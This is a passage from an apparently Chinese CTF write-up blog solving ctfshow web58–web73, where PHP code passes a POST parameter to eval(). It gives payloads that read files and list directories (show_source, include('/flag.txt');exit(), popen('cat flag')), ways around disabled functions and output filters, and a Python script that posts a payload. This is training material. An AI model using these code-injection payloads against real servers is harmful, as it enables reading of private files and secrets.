var_dump</span></span><br><span class="line">fread(fopen(<span class="variable">$filename</span>,<span class="string">&quot;r&quot;</span>), <span class="variable">$size</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$filename</span>); <span class="comment">// 非php代码</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="variable">$filename</span>); <span class="comment">// 非php代码</span></span><br><span class="line"><span class="keyword">require</span>(<span class="variable">$filename</span>); <span class="comment">// 非php代码</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="variable">$filename</span>); <span class="comment">// 非php代码</span></span><br><span class="line">print_r(fread(popen(<span class="string">&quot;cat flag&quot;</span>, <span class="string">&quot;r&quot;</span>), <span class="variable">$size</span>));</span><br><span class="line">print_r(fgets(fopen(<span class="variable">$filename</span>, <span class="string">&quot;r&quot;</span>))); <span class="comment">// 读取一行</span></span><br><span class="line">fpassthru(fopen(<span class="variable">$filename</span>, <span class="string">&quot;r&quot;</span>)); <span class="comment">// 从当前位置一直读取到 EOF</span></span><br><span class="line">print_r(fgetcsv(fopen(<span class="variable">$filename</span>,<span class="string">&quot;r&quot;</span>), <span class="variable">$size</span>));</span><br><span class="line">print_r(fgetss(fopen(<span class="variable">$filename</span>, <span class="string">&quot;r&quot;</span>))); <span class="comment">// 从文件指针中读取一行并过滤掉 HTML 标记</span></span><br><span class="line">print_r(fscanf(fopen(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;r&quot;</span>),<span class="string">&quot;%s&quot;</span>));</span><br><span class="line">print_r(parse_ini_file(<span class="variable">$filename</span>)); <span class="comment">// 失败时返回 false , 成功返回配置数组</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=show_source(<span class="string">&quot;flag.php&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web58.png"></p><p>脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="comment"># Author: MTRleed</span></span><br><span class="line"><span class="comment"># file: web58.py</span></span><br><span class="line"><span class="comment"># time: 2023/4/19 19:04</span></span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">url = <span class="string">&quot;http://d3eb9cfc-e620-4c6a-bc64-b8d0fdc1f017.challenge.ctf.show/&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;c&quot;</span>:<span class="string">&quot;show_source(\&quot;flag.php\&quot;);&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url = url ,data = data)</span><br><span class="line">flag = re.search(<span class="string">&quot;(ctfshow&#123;.*?&#125;)&quot;</span>,res.text)</span><br><span class="line">flag = flag.group(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">print</span>(flag)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web58-1.png"></p><p>​      </p><h3 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">代码不变，但是应该做了过滤，只是我们看不到源码，show_source()还可以用</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=show_source(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure><p>​       </p><h3 id="web60"><a href="#web60" class="headerlink" title="web60"></a>web60</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">代码不变，show_source()还能用</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=show_source(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure><p>​      </p><h3 id="web61"><a href="#web61" class="headerlink" title="web61"></a>web61</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">代码不变，show_source()还能用</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: c=show_source(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure><p>​      </p><h3 id="web62"><a href="#web62" class="headerlink" title="web62"></a>web62</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">代码不变，show_source()还能用</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:c=show_source(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure><p>​      </p><h3 id="web63"><a href="#web63" class="headerlink" title="web63"></a>web63</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">代码不变，show_source()还能用</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=show_source(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure><p>​      </p><h3 id="web64"><a href="#web64" class="headerlink" title="web64"></a>web64</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">代码不变，show_source()还能用</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=show_source(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure><p>​      </p><h3 id="web65"><a href="#web65" class="headerlink" title="web65"></a>web65</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">代码不变，show_source()还能用</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=show_source(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure><p>​        </p><h3 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">代码不变，show_source()不能用了，尝试使用其他函数 highlight_file(<span class="variable">$filename</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=highlight_file(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure><p>但是flag不在这里 </p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web66.png"></p><p>查看根目录下文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=print_r(scandir(<span class="string">&quot;/&quot;</span>));</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web66-1.png"></p><p>读取根目录下的这个文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=highlight_file(<span class="string">&quot;/flag.txt&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web66-2.png"></p><p>​         </p><h3 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">代码不变</span><br></pre></td></tr></table></figure><p>使用print_r查看目录被ban</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=print_r(scandir(<span class="string">&quot;/&quot;</span>));</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web67.jpg" alt="web67"></p><p>改用var_dump，发现flag.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=var_dump(scandir(<span class="string">&quot;/&quot;</span>));</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web67-0.jpg"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: c=highlight_file(<span class="string">&quot;/flag.txt&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web67-1.jpg"></p><p>​      </p><h3 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">无源码 </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web68.png"></p><p>明显禁用了 highlight_file() 函数，连源码都看不到了，盲猜还是c变量POST请求，先试试能不能打印目录文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=var_dump(scandir(<span class="string">&quot;/&quot;</span>));</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web68-1.png"></p><p>尝试读取flag，禁用了很多文件读取函数，include()可以用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web68-2.png"></p><p>​     </p><h3 id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">无源码</span><br></pre></td></tr></table></figure><p>同样显示禁用了某某函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=var_dump(scandir(<span class="string">&quot;/&quot;</span>));</span><br><span class="line">c=print_r(scandir(<span class="string">&quot;/&quot;</span>));</span><br></pre></td></tr></table></figure><p>显示被禁用，那我们用别的，区别请看web40</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=var_export(scandir(<span class="string">&quot;/&quot;</span>));</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web69.png"></p><p>打印一下文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web69-1.png"></p><p>​     </p><h3 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">无源码</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web70.png"></p><p>尝试打印文件目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=var_export(scandir(<span class="string">&quot;/&quot;</span>));</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web70-1.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">打印输出 c=<span class="keyword">include</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web70-2.png"></p><p>​      </p><h3 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">题目提供.php文件，下载查看</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web71.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">你要上天吗？</span><br></pre></td></tr></table></figure><p>代码显示关闭报错，传入的参数先被缓冲区接收随后缓冲区数据经过正则过滤后打印输出，被匹配到的数字和字母都会被替换成? 。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=var_export(scandir(<span class="string">&quot;/&quot;</span>)); 试试水</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web71-1.png"></p><p>如何绕过呢？我们发现正则匹配在eval()函数之后被执行的，我只要eval执行就可以了，那我们可以提前终止语句的执行，在payload后添加终止函数exit()，这个web42有异曲同工之妙</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=var_export(scandir(<span class="string">&quot;/&quot;</span>));<span class="keyword">exit</span>();</span><br><span class="line">c=var_export(scandir(<span class="string">&quot;/&quot;</span>));quit();</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web71-2.png"></p><p>读取打印flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span>(<span class="string">&quot;/flag.txt&quot;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>​     </p><h3 id="web72-未完成"><a href="#web72-未完成" class="headerlink" title="web72(未完成)"></a>web72(未完成)</h3><p>题目提供.php文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">你要上天吗？</span><br></pre></td></tr></table></figure><p>代码不变，但是读取不了目录了</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web72.png"></p><p>​     </p><h3 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h3><p>依旧没有源码</p><p>先查看目录，后四种任选一个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">print_r(glob(<span class="string">&quot;*&quot;</span>)); <span class="comment">// 列当前目录</span></span><br><span class="line">print_r(glob(<span class="string">&quot;/*&quot;</span>)); <span class="comment">// 列根目录</span></span><br><span class="line">print_r(scandir(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">print_r(scandir(<span class="string">&quot;/&quot;</span>));</span><br><span class="line"><span class="variable">$d</span>=opendir(<span class="string">&quot;.&quot;</span>);<span class="keyword">while</span>(<span class="literal">false</span>!==(<span class="variable">$f</span>=readdir(<span class="variable">$d</span>)))&#123;<span class="keyword">echo</span><span class="string">&quot;<span class="subst">$f</span>\n&quot;</span>;&#125;</span><br><span class="line"><span class="variable">$d</span>=dir(<span class="string">&quot;.&quot;</span>);<span class="keyword">while</span>(<span class="literal">false</span>!==(<span class="variable">$f</span>=<span class="variable">$d</span>-&gt;read()))&#123;<span class="keyword">echo</span><span class="variable">$f</span>.<span class="string">&quot;\n&quot;</span>;&#125;</span><br><span class="line"><span class="variable">$a</span>=glob(<span class="string">&quot;/*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;<span class="keyword">echo</span> <span class="variable">$value</span>.<span class="string">&quot;   &quot;</span>;&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&#x27;glob:///*&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&quot; &quot;</span>);&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$d</span>=opendir(<span class="string">&quot;/&quot;</span>);<span class="keyword">while</span>(<span class="literal">false</span>!==(<span class="variable">$f</span>=readdir(<span class="variable">$d</span>)))&#123;<span class="keyword">echo</span><span class="string">&quot;<span class="subst">$f</span>\n&quot;</span>;&#125;;<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web73.png"></p><p>文件名改变了，注意</p><p>打印</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span>(<span class="string">&quot;/flagc.txt&quot;</span>);<span 